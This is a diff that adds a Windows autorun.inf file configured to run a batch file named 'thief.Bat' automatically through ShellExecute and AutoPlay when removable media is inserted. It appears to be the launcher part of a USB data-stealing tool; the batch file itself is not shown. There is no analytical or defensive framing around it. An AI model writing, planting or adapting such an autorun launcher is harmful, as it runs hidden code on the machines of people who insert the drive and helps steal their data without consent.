@@ -1,0 +1,4 @@
+[autorun]
+;Open=thief.Bat
+ShellExecute=thief.Bat
+UseAutoPlay=1
